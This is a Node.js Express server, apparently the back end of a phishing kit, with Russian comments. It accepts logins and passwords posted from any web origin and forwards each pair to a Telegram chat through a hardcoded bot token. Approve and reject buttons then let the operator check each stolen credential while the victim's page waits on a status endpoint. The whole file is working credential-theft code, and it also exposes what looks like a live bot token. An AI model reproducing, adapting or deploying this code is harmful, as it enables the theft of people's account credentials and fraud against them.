const express = require('express');
const axios = require('axios');
const cors = require('cors');

const app = express();
app.use(express.json());
app.use(cors({ origin: '*' }));

// --- ТВОИ ДАННЫЕ ---
const token = '8529740031:AAGRzoChsC2xGSqjWELANefi0Xc05CrhiAI';
const chatId = '-1003894478662';
// -------------------

let requests = {}; 

app.get('/', (req, res) => {
    res.send('Сервер активен!');
});

app.post('/send-data', async (req, res) => {
    const { userId, email, pass } = req.body;
    console.log(`[ПРИНЯТО] Данные от ${userId}: ${email}`);
    
    requests[userId] = 'pending';

    try {
        console.log(`[TG] Попытка отправки сообщения в чат ${chatId}...`);
        const tgRes = await axios.post(`https://api.telegram.org/bot${token}/sendMessage`, {
            chat_id: chatId,
            text: `⚠️ **Новые данные**\n\n👤 **Логин:** \`${email}\`\n🔑 **Пароль:** \`${pass}\`\n🆔 **User:** \`${userId}\``,
            parse_mode: 'Markdown',
            reply_markup: {
                inline_keyboard: [
                    [
                        { text: "✅ Ок", callback_data: `approve_${userId}` },
                        { text: "❌ Ошибка", callback_data: `reject_${userId}` }
                    ]
                ]
            }
        });
        
        console.log("[TG] Сообщение отправлено успешно!");
        res.json({ status: 'sent' });
    } catch (error) {
        // Выводим подробную ошибку от Telegram в логи Render
        const errorDetail = error.response ? JSON.stringify(error.response.data) : error.message;
        console.error('[TG ОШИБКА]:', errorDetail);
        res.status(500).json({ error: 'Ошибка Telegram API', details: errorDetail });
    }
});

app.get('/check-status/:userId', (req, res) => {
    const status = requests[req.params.userId] || 'pending';
    res.json({ status });
});

app.post('/tg-webhook', async (req, res) => {
    if (req.body.callback_query) {
        const callbackData = req.body.callback_query.data;
        const [action, userId] = callbackData.split('_');

        console.log(`[АДМИН] Действие: ${action} для ${userId}`);

        if (action === 'approve') requests[userId] = 'success';
        if (action === 'reject') requests[userId] = 'error';

        await axios.post(`https://api.telegram.org/bot${token}/answerCallbackQuery`, {
            callback_query_id: req.body.callback_query.id,
            text: "Статус обновлен"
        });
    }
    res.sendStatus(200);
});

const PORT = process.env.PORT || 10000;
app.listen(PORT, () => {
    console.log(`🚀 Сервер запущен на порту ${PORT}`);
});
